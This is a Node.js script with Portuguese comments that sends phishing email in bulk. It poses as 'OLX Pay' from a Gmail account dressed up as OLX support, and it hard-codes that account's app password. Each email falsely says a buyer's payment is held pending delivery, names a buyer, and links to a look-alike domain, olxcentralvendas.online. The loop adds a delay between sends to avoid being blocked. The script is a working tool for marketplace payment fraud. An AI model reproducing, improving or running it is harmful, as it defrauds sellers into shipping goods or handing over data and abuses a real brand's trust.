const nodemailer = require("nodemailer");
const fs = require("fs");
const path = require("path");

// Configuração do transporte SMTP
const transporter = nodemailer.createTransport({
  service: "gmail", // troque para seu serviço: 'gmail', 'hotmail', etc
  auth: {
    user: "olx.suportedevendas.ltdaonline@gmail.com", // seu email
    pass: "gcjt mlpl xozn ujmt", // sua senha ou senha de app
  },
});

/**
 * Função para enviar e-mail
 * @param {string} destinatario - e-mail do destinatário
 * @param {string} assunto - assunto do e-mail
 * @param {string} htmlConteudo - conteúdo em HTML do e-mail
 */
async function enviarEmail(destinatario, assunto, htmlConteudo) {
  const mailOptions = {
    from: '"Equipe OLX Pay" <seu.email@gmail.com>', // remetente
    to: destinatario,
    subject: assunto,
    html: htmlConteudo,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`✅ Email enviado para ${destinatario}: ${info.messageId}`);
    return true;
  } catch (error) {
    console.error(`❌ Erro ao enviar email para ${destinatario}:`, error);
    return false;
  }
}

/**
 * Função para carregar dados de vendas do arquivo JSON
 * @returns {Array} Array com dados de vendas
 */
function carregarDadosVendas() {
  try {
    const caminhoArquivo = path.join(__dirname, "../data/vendas.json");
    const dados = fs.readFileSync(caminhoArquivo, "utf8");
    return JSON.parse(dados);
  } catch (error) {
    console.error("Erro ao carregar dados de vendas:", error);
    return [];
  }
}

/**
 * Função para enviar e-mails em massa para uma lista de destinatários
 * @param {Array} listaEmails - lista de e-mails destinatários
 * @param {string} codigoProduto - (opcional) código específico do produto
 * @param {string} assuntoPersonalizado - (opcional) assunto personalizado do e-mail
 */
async function enviarEmMassa(
  listaEmails,
  codigoProduto = null,
  assuntoPersonalizado = null
) {
  // Carregar dados de vendas
  const dadosVendas = carregarDadosVendas();

  if (dadosVendas.length === 0) {
    console.error(
      "Não foi possível carregar dados de produtos para o envio em massa"
    );
    return;
  }

  // Se não foi especificado um código, usa o primeiro produto na lista
  const produto = codigoProduto
    ? dadosVendas.find((p) => p.codigo === codigoProduto)
    : dadosVendas[0];

  if (!produto) {
    console.error(`Produto com código ${codigoProduto} não encontrado`);
    return;
  }

  // Informações para o e-mail
  const codigoVenda = produto.codigo;
  const nomeProduto = produto.produto;
  const valorProduto = produto.valor;
  const nomeComprador = produto.comprador;

  const linkProduto = `https://olxcentralvendas.online/pag/?id=${codigoVenda}`;

  // Contadores para estatísticas
  let enviados = 0;
  let falhas = 0;

  // Assunto do e-mail
  const assunto =
    assuntoPersonalizado ||
    `OLX Pay - Confirmação de Pagamento para ${nomeProduto}`;

  console.log(
    `Iniciando envio em massa para ${listaEmails.length} destinatários...`
  );
  console.log(`Produto: ${nomeProduto} (${codigoVenda})`);

  // Enviar para cada e-mail da lista
  for (const email of listaEmails) {
    // Template do e-mail com link personalizado
    const mensagemHTML = `<div
    style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; background-color: #f9f9f9;">
    <h2 style="color: #333;">📨 Confirmação de Pagamento Recebido</h2>

    <p>Olá,</p>

    <p>Informamos que o pagamento referente ao seu produto foi <strong>recebido com sucesso</strong> em nossa
        plataforma.</p>

    <p>Agora, você já pode providenciar o envio com segurança para o Comprador: <strong>${nomeComprador}</strong></p>

    <p><strong>Forma de envio:</strong> Entrega</p>

    <p><strong>O comprador deve informar:</strong></p>
    <ul>
        <li>Placa do veículo</li>
        <li>Modelo do veículo</li>
        <li>Nome do motorista responsável pela entrega</li>
    </ul>

    <hr style="border: none; border-top: 1px solid #ccc;" />

    <p><strong>Observação importante:</strong><br>
        Para garantir a segurança de todos, observamos que esta é uma das suas primeiras transações. Por esse motivo, o
        valor ficará temporariamente retido em nossa conta até a confirmação da entrega.</p>

    <p>Assim que o produto for entregue e confirmado no sistema, o valor será liberado automaticamente para sua conta.
    </p>

    <div style="text-align: center; margin: 30px 0;">
        <a href="${linkProduto}"
            style="background-color: #4CAF50; color: white; padding: 12px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">Visualizar
            Produto e Envio</a>
    </div>

    <p>Essa medida garante uma experiência segura e protegida para ambas as partes.</p>

    <p>Em caso de dúvidas, entre em contato com nossa equipe de suporte.</p>

    <p style="color: #555; font-size: 14px;">Atenciosamente,<br><strong>Equipe de Suporte</strong><br>OLX Entregas
        Seguras</p>
</div>`;

    // Enviar e-mail
    const resultado = await enviarEmail(email, assunto, mensagemHTML);

    if (resultado) {
      enviados++;
    } else {
      falhas++;
    }

    // Pequeno delay para evitar bloqueios do servidor de e-mail
    await new Promise((resolve) => setTimeout(resolve, 1500));
  }

  console.log(`
  ✅ Envio em massa concluído:
  - E-mails enviados com sucesso: ${enviados}
  - Falhas no envio: ${falhas}
  - Total de tentativas: ${listaEmails.length}
  `);
}

// Exportar funções
module.exports = {
  enviarEmail,
  enviarEmMassa,
  carregarDadosVendas,
};

// Descomentar para testar
// teste();
// testarEnvioEmMassa();
